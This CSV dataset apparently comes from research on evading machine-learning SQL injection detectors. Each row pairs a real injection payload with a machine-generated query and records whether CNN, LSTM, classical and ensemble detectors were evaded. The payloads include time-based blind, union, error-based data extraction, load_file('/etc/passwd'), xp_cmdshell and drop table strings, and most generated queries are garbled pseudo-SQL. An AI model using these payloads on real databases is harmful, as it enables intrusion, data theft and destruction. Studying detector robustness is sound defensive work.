original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"-4807' where 3232  =  3232 or make_set  (  6599  =  5179,5179  )  --","SELECT MIN(sql injection) FROM SQL_Injection WHERE 3232 = 3232 OR make_set (6599 = 5179,5179)",1,1,0,0,0,0,0
"1""   )    )     )   and sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection detection,1,1,1,1,1,1,1
1' waitfor delay '0:0:5',SELECT MIN(waitfor delay) FROM SQL injection,1,0,0,1,1,1,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",SELECT MIN(SELECT) FROM (SELECT SELECT SELECT MIN(ROWNUM) FROM sys.all_tables) AND NOT SELECT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(ROWNUM) FROM sys.all_tables) FROM (SELECT SELECT SELECT SELECT SELECT SELECT FROM SQL_inaddr.get_host_address.inaddr.get_host_address.inaddr.get_host_address) FROM (SELECT SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT ,0,0,1,1,1,1,1
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN cgow's = 1",0,1,0,0,0,0,0
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # qmkh",SELECT MIN(500000000000/2 ) FROM qmkh WHERE NOT qmkh = 'evade sq injection',1,1,1,1,1,1,1
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xonc'  =  'xonc",SELECT MIN(s) FROM SQL injection_diagnosis) FROM SQL_injection,1,0,0,1,1,1,0
"-8869"" where 3019  =  3019 union all select 3019,3019,3019#","SELECT MIN(3019 = 3019 = 3019 WHERE NOT -8869 = ""SQL injection detection""",1,1,0,0,0,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT MIN(granted_role) FROM dba_role_privs WHERE GRANTEE = 'SYS.LOGINUSER'),1,0,1,0,1,1,0
"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#","SELECT MIN(2076,2076,2076,2076,2076,2076,2076# FROM SQL SELECT MIN(SQL injection) FROM Query: -4236')",1,1,1,1,0,1,0
"' union select 1,load_file('/etc/passwd'),1,1,1;",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,SELECT DISTINCT echl FROM SQL - SELECT vwyq FROM SQL - SELECT vwyq FROM SQL - SELECT vwyq FROM SQL - SELECT vwyq FROM SELECT vwyq = '6593 = 6593',1,1,0,1,1,1,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%""  =  ""","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE NOT all_users = 'evade'",1,0,0,0,1,0,0
"1%"" and make_set  (  2905  =  5725,5725  )   and ""%""  =  ""","SELECT MIN(2905 = 5725,5725 ) FROM SQL injection detection",1,1,1,1,1,1,1
"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))","SELECT MIN(-3+5,bin(15) FROM SQL_Injection WHERE NOT SELECT SELECT DISTINCT - elt(-3+5,bin(15) FROM SQL_injection)",1,1,0,1,1,1,0
"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1%'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT DISTINCT hex ( randomblob ( 500000000000/2 ),1,1,0,1,1,1,0
"-3805""   )    )     )   union all select 9123,9123,9123,9123,9123,9123,9123,9123#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT DISTINCT -3805""",0,0,1,1,1,1,1
"1""  )   as nixg where 4580  =  4580 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",SELECT MIN(sql injection) FROM SQL_Injection WHERE 4580 = 4580 AND 4241 = 'convert (int)',1,1,0,0,0,0,0
"1%"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL_Injector WHERE NOT SELECT DISTINCT 'evade SQL injection detection' AND NOT hex ( randomblob ( 500000000000/2 ) = '8148 = like (SELECT MIN(500000000000/2 ) FROM SQL),0,1,0,0,1,0,0
-8032%'   )    )     )   or 9323  =  9323#,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -8032%' ) ORDER BY 9323 = 9323,1,1,0,0,0,0,0
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL JOIN 2105 = 2105 OR 4144 = 4144 = (SELECT SUM(SELECT SUM(SUM(SUM(SUM)) FROM SQL),0,1,0,0,1,0,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'xori' like 'xori","SELECT COUNT(*) FROM create_series WHERE NOT SQL_injection = ""valid""",1,0,1,0,1,1,0
"1""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL injection,1,0,1,1,1,1,1
"1   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT NOT SQL_key FROM SQL ORDER BY COUNT(*),1,0,1,1,1,1,1
"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '","SELECT MIN( 6272 = 6272,sleep ( 5 ) & (% = 'evade SQL injection detection') FROM SQL injection",1,1,0,0,0,0,0
"-6595"" order by 1--",SELECT MIN(1 - 6595) FROM SQL injection detection,1,0,0,1,1,1,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28","SELECT MIN(SQL) FROM SQL JOIN SELECT 1,2,3,4,5,7,9 FROM SQL JOIN detection of evade SQL injection detection",0,1,1,0,0,0,0
"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'agsi'  =  'agsi","SELECT MIN(*) FROM SQL injection, SELECT MIN(*) FROM sysibm.systables as t1,sysibm.systables as t3 INTERSECT SELECT MIN(*) FROM SQL JOIN sysibm.systables as t3 / t3.sysi) FROM sysibm.systables as 'evade SQL injection','sq injection','sql') ='sql injection'",1,1,0,0,0,0,0
"-3525"" where 3522  =  3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",SELECT MIN(sql injection) FROM SQL_injection WHERE 3522 = 3522,1,0,1,1,0,1,0
"1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",SELECT MIN(excat) FROM SQL_injection WHERE NOT md5 ( 0x4b774c75 ) = 'evade sq injection',1,1,0,0,1,0,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd",SELECT MIN(3702) FROM SQL_injection WHERE NOT char_injection = 'evade SQL injection detection',1,0,1,1,1,1,1
1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,"SELECT 6969 FROM pg_sleep WHERE NOT iSQ_injection = ""evade SQL injection detection"" AND NOT i_engine_required = ""engineer: 1' AND 6969 = (SELECT 6969 FROM pg_sleep ( 5 )""",1,1,0,0,0,0,0
"))) and 0=benchmark(3000000,MD5(1))%20%23","SELECT 3000000,MD5(1))%20%23 FROM SQL AS T1 JOIN query: 0 = benchmark(3000000,MD5(1))",0,1,0,0,1,0,0
"-9504%""   )    )    or 8098  =  7472",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) FROM query: -9504% ) ORDER BY MIN(8098 = 7472,1,1,0,0,1,0,0
1   )    )    as ipfy where 1189  =  1189,"SELECT * FROM query: 1 ) as __chart_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_unique = 1189 AND NOT SQL_inject = ""unknown"" AND ipfy = 1189",1,0,0,0,1,0,0
"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,SELECT MIN(*) FROM SQL injection detection WHERE NOT SQL injection_detecting = 'evade SQL injection',1,0,1,1,1,1,1
*  (  |  (  objectclass  =  *   )    ) ,"SELECT * FROM SQL AS _valid_sq_injector WHERE NOT _sq_inject = ""valid""",1,0,1,1,1,1,1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","SELECT (SELECT NULL, NULL) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM SQL, invalid AS _sq_injector WHERE NOT SELECT NULL FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(sql) FROM SELECT NULL, NULL) FROM SELECT NULL FROM Query: +if(dum5(1)) FROM SELECT NULL, NULL FROM SELECT NULL FROM query: +if(dum5(1)) FROM SELECT NULL FROM SELECT NULL, NULL FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM SELECT NULL, NULL FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM SELECT NULL, NULL FROM query: +",1,1,0,0,1,0,0
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",SELECT MIN(sql) FROM SQL_injection) FROM SQL_injection WHERE NOT crypt_key = 'nwdk',1,0,1,0,1,1,0
1'   )    )    as jtmf where 3937  =  3937,SELECT MIN(3937 = 3937) FROM SQL injection,1,1,1,1,1,1,1
"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT * FROM SQL_injector WHERE NOT NULL IN (SELECT NULL FROM query),1,0,1,1,1,1,1
1%'   )    )     )   union all select null--,SELECT DISTINCT null-- FROM SQL injection,1,1,1,1,1,1,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""jwzy""  =  ""jwzy","SELECT * FROM (SELECT * FROM (SELECT * FROM query WHERE NOT jwzy = ""jwzy"")",1,0,1,0,1,1,0
1%'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',"SELECT DISTINCT 'evade SQL injection' FROM SQL SELECT DISTINCT'sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq','sqpjq')'",1,1,1,0,0,0,0
"-2033""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SELECT MIN(0x7171706a71, 0x7171706a71, 0x717a71, 0x717a767a71, 0x717a71, 0x717a7, 0x717a71, 0x717a7, 0x717a71, 0x717a71, 0x717a767a71, 0x717a71, 0 - 1",0,1,1,1,0,1,0
"1""  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7  (SELECT MIN(*) FROM SQL))",0,1,0,0,0,0,0
"-9119""  )   where 9237  =  9237 or 8571  =  8571--",SELECT MIN(sql injection) FROM SQL_injection WHERE 9237 = 9237 OR 8571 = 8571--,1,1,0,0,0,0,0
"-9003""   )    )    union all select 9721,9721--","SELECT 9721,9721-- FROM SQL_Injection WHERE NOT SELECT 9721,9721-- FROM SQL_Injection",1,1,1,1,0,1,0
"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","SELECT MIN(5000000,md5 ( 0x544d5a4c ) FROM SQL injection AS t1 JOIN Query: 1%' OR t1.md5 = '8514 = benchmark (5000000,md5 ( 0x544d5a4c )'",1,1,0,0,0,0,0
-2604   )    )    as sekb where 6897  =  6897 or 1000  =  7683,SELECT MIN(sqb) FROM query: -2604 ) AS _cb FROM query: -2604 ORDER BY 6897 = 6897,1,1,0,1,1,1,0
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz","SELECT * FROM (SELECT SUM(search_adkwz) FROM query: 1 AND NOT SQL_inject_elt (SELECT 0x7171706a71, 0x71706a71, 0x71706a71, ) FROM (SELECT dkwz FROM SQL WHERE NOT SQL_injection = ""valid"")",1,1,1,0,1,1,0
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: '; exec master..xp_cmdshell 'ping 172.10.1.255'-- SELECT SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
"1%""   )    )    union all select null#",SELECT NOT SELECT DISTINCT null# FROM SQL injection,1,0,1,1,1,1,1
"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",SELECT DISTINCT esq_injection FROM SQL SELECT MIN(sql) FROM query: 1 WHERE NOT case when ( 3717 = 3717 - then 1 else 3717* (SELECT 3717 FROM master..sysdatabases ),0,1,0,0,1,0,0
"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
1%' rlike sleep  (  5  )  #,SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"1""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""sjiz"" like ""sjiz","SELECT MIN(*) FROM SQL_injection WHERE NOT rdb$types = 't2,rdb$functions as t3,rdb$functions as t3,rdb$functions as t4 INTERSECT SELECT DISTINCT COUNT(*) FROM SQL_Injection)",0,1,0,0,0,0,0
"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ","SELECT MIN(excat) FROM SQL, extractvalue WHERE NOT 0x5c = 5840 AND NOT 0x7171706a71 = 1",1,1,0,0,1,0,0
"1"" where 7232  =  7232   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE NOT char(5451 = 5451) AND NOT char(5451 = 7232 = 7232",1,1,0,0,1,0,0
"1""  )   as wmng where 5976  =  5976",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
-8010' or   (  2225  =  8491  )  *8491 and 'eipf'  =  'eipf,SELECT MIN(2225 = 8491) FROM SQL injection,1,1,1,1,1,1,1
"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE 6138 = 6138 AND 8594 = (SELECT 8594 FROM pg_sleep ( 5 ),1,1,0,0,0,0,0
1'+  (  select 'rejz' where 1530  =  1530 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"-3283  )   where 1948  =  1948 union all select 1948,1948,1948#","SELECT -3283 FROM SQL injection_description WHERE 1948 = 1948 = 1948 union All select 1948,1948,1948# FROM SQL SELECT * FROM SQL_Injection_Query: -3283 - 1948 = 1948",1,1,1,1,0,1,0
"-8266%'  )   union all select 8626,8626,8626,8626,8626,8626--","SELECT MIN(8626,8626,8626,8626-- MIN(8626--) FROM SQL_Injection AS t1 JOIN 8626,8626,8626,8626,8626-- FROM SQL_Injection AS t2 ON t1.8626 = t2.8626,8626,8626,8626-- FROM 8626,8626--",1,1,1,1,0,1,0
"1'+  (  select 'bsva' where 4378  =  4378 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'","SELECT MIN(*) FROM SQL injection_diagnosis WHERE 4378 = 4378 OR 4378 = 4378 OR 7552 = (SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(CASE WHEN STRFTIME('%y', '%s-%m','sq injection') ='sq injection')",0,1,0,0,1,0,0
"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
-9875'  )   or   (  8459  =  8459  )  *4906 and   (  'mrxw'  =  'mrxw,"SELECT *4906,'mrxw' FROM SQL injection' ORDER BY'sql injection'",1,0,1,1,0,1,0
' ; drop table temp --,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""mlld"" like ""mlld","SELECT MIN(success injection) FROM SQL_Injections WHERE NOT 0x7171706a71 = ""Deleted""",1,0,1,0,1,1,0
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'cpfn' like 'cpfn","SELECT MIN(*) FROM SQL injection, SELECT MIN(*) FROM SQL SELECT MIN(sql injection) FROM SQL",1,0,1,1,1,1,1
1 rlike sleep  (  5  ) ,"SELECT * FROM SQL AS t1 JOIN query: 1 rlike sleep ( 5 ) AS t2 ON t1.sq = t2.sql injection_code WHERE NOT t2.valid = ""sq injection""",1,1,0,0,0,0,0
1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,"SELECT * FROM SQL AS _uadn WHERE NOT uadn = ""9588 = 9588 = 9588 rlike sleep ( 5 )""",1,1,0,0,0,0,0
ORDER BY SLEEP(5)#,"SELECT * FROM SLEEP(5)# WHERE NOT SQL_injection = ""valid""",0,1,1,0,1,1,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",SELECT MIN(SELECT) FROM (SELECT SUM(SELECT SUM(SELECT SUM(SELECT) FROM sys.all_tables) AND NOT i'= 'evade SQL injection detection'),0,0,1,0,1,1,0
"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # ehsr","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3 JOIN SQL injection detection'",1,1,1,1,0,1,0
-6244'  )   as szpd where 8445  =  8445 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,SELECT DISTINCT syst_injection FROM SQL_injection WHERE 8445 = 8445 OR 2724 = 2724 OR ( 113 = 113 ) +char ( 113 ) +char ( 113 ) +char ( 113 ) FROM SQL injection detection),0,1,0,0,0,0,0
"1""  )   as tecq where 4817  =  4817 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT MIN(*) FROM SQL_Injection WHERE 4817 = 4817 AND NOT sysibm.systables as t2,sysibm.systables as t3 = 0",1,1,0,0,0,0,0
1'   )    )    as mqnv where 9831  =  9831,SELECT MIN(9831 = 9831) FROM SQL injection,1,1,0,1,1,1,0
"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,SELECT MIN(SQL) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) AND NOT (SELECT SUM((SQL_inaddr.xr ( 4386 = 4386),1,1,0,0,1,0,0
"1""   )    )    as dshc where 9911  =  9911 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL_injection WHERE 9911 = 9911 OR 99_users = 1022 = (SELECT SUM(SELECT SUM(*) FROM SQL_injection),1,1,0,0,0,0,0
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'jylk'  =  'jylk",SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT chr ( 76 ) = 'dbms_pipe.receive_message',1,0,0,0,1,0,0
"1"" and   (  1668  =  8054  )  *8054",SELECT MIN(1668 = 8054 ) FROM SQL injection,1,1,0,0,1,0,0
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,SELECT MIN(SQL) FROM SQL Injection),1,0,1,1,1,1,1
hi' or 1  =  1 --,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#","SELECT 8396 = 8396,8396# FROM SQL injection",1,1,1,1,0,1,0
ORDER BY 14#,"SELECT * FROM query: SELECT query: SELECT query: SELECT query FROM 14# WHERE NOT SQL_inject = ""valid""",1,0,1,1,1,1,1
1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,SELECT MIN(sql) FROM SQL injection detection WHERE NOT'sq injection detection' AND 4242 = 5831 AND ( (SELECT MIN(sqlh) FROM SQL injection detection),0,1,1,1,1,1,1
select sleep  (  5  )   and    (    (     (  '%'  =  ',SELECT * FROM SQL AS t1 JOIN sleep ( 5 ) AND NOT t1.% = '%' AND NOT t1.sql = 'valid',0,1,0,0,0,0,0
"1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#","SELECT MIN(sql injection) FROM SQL_injection WHERE ""4893 = 4893 union all select null,null,null,null#"" = ""4893 = 4893""",1,1,0,0,0,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",SELECT MIN(SELECT) FROM SQL_injection WHERE NOT SELECT SELECT FROM SQL_injection,0,0,1,1,1,1,1
"-8588' union all select 2135,2135--","SELECT MIN(2135,2135--) FROM SQL_Injection AS t1 JOIN Query: -8588' union = ""SQL""",0,1,0,0,0,0,0
union all select @@version--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
